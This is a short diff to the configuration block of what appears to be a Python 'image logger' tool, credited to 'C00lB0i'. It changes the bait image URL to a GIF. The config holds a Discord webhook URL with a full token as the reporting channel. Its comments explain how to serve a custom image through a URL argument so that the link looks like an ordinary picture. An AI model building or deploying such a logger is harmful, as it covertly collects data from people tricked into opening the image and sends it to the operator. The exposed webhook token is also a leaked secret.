@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1401663493823926462/UhJWOuK15ETWylfXlBxxhyYO7Qrx5OfDUmYbu0Ypme9fPF-PNMYf9hZvq8yRKzftwObJ",
-    "image": "https://static.wikia.nocookie.net/roshidere/images/6/6b/Alisa_Mikhailovna_Kujou_Anime.png/revision/latest/scale-to-width/360?cb=20240821160008", # You can also have a custom image by using a URL argument
+    "image": "https://tenor.com/kTFiRhhijzv.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
